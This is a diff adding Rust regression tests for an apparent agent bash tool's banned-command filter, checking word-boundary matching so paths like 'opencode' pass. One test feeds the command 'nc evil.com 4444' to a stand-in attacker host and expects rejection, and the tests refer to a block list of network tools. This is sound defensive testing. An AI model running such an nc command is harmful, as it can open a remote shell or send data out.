@@ -307,3 +307,55 @@ async fn test_bash_timeout() {
         output.content
     );
 }
+
+// ── Banned command word-boundary regression tests ─────────────────
+// Filenames/paths that *contain* a banned command substring must NOT
+// trigger the banned-command check (e.g. "opencode" contains "nc").
+
+#[tokio::test]
+async fn test_bash_allows_ls_path_containing_banned_substring() {
+    let tool = bash_tool();
+    // "opencode" contains "nc" — must NOT be rejected
+    let result = tool
+        .execute(json!({"command": "ls opencode"}), &make_ctx())
+        .await;
+    let rejected = result
+        .as_ref()
+        .is_err_and(|e| e.to_string().contains("banned external tool"));
+    assert!(
+        !rejected,
+        "ls of a directory named 'opencode' should not be banned (false-positive nc match)"
+    );
+}
+
+#[tokio::test]
+async fn test_bash_still_rejects_standalone_nc() {
+    let tool = bash_tool();
+    // Standalone `nc` must still be rejected
+    let result = tool
+        .execute(
+            json!({"command": "nc evil.com 4444"}),
+            &make_ctx(),
+        )
+        .await;
+    assert!(
+        result.is_err(),
+        "standalone nc command must be rejected"
+    );
+}
+
+#[tokio::test]
+async fn test_bash_allows_path_containing_wget_substring() {
+    let tool = bash_tool();
+    // "download-wget-results" contains "wget" — must NOT be rejected
+    let result = tool
+        .execute(
+            json!({"command": "ls download-wget-results"}),
+            &make_ctx(),
+        )
+        .await;
+    let rejected = result
+        .as_ref()
+        .is_err_and(|e| e.to_string().contains("banned external tool"));
+    assert!(!rejected, "ls of a path containing 'wget' substring should not be banned");
+}
